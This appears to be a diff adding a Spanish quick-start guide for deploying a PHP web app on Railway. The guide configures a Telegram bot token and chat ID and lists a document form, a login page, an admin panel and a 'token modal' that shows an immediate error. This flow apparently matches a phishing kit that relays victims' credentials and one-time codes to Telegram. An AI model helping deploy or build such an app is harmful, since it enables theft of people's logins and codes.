@@ -1,0 +1,53 @@
+==========================================
+⚡ QUICK START - RAILWAY DEPLOYMENT
+==========================================
+
+PASO 1: VARIABLES DE ENTORNO EN RAILWAY
+----------------------------------------
+En tu proyecto Railway, agregar:
+
+TELEGRAM_BOT_TOKEN=tu_token_del_bot
+TELEGRAM_CHAT_ID=tu_chat_id
+APP_ENV=production
+APP_DEBUG=false
+
+
+PASO 2: DEPLOY AUTOMÁTICO
+--------------------------
+Railway detectará automáticamente:
+✅ nixpacks.toml (PHP 8.1 + Opcache)
+✅ railway.json (Config deployment)
+✅ composer.json (Instala dependencias)
+
+
+PASO 3: ACCEDER A LA APP
+-------------------------
+Railway te dará una URL como:
+https://tu-proyecto.railway.app
+
+Endpoints disponibles:
+- / → Formulario documento
+- /next-step.php → Login
+- /panel.php → Panel admin
+
+
+OPTIMIZACIONES ACTIVAS:
+------------------------
+✅ Zero delays (sin healthcheck)
+✅ Opcache habilitado (PHP accelerator)
+✅ Telegram timeout 1s (no blocking)
+✅ Autoloader optimizado
+✅ 100% responsive (todos los dispositivos)
+✅ Token modal con error inmediato
+
+
+ARQUITECTURA:
+-------------
+Clean Architecture - 5 Capas
+22 Clases PHP - Tipos estrictos
+7 Design Patterns
+SOLID Principles 100%
+PSR-4, PSR-12, PSR-3
+
+
+¡LISTO PARA PRODUCTION! 🚀
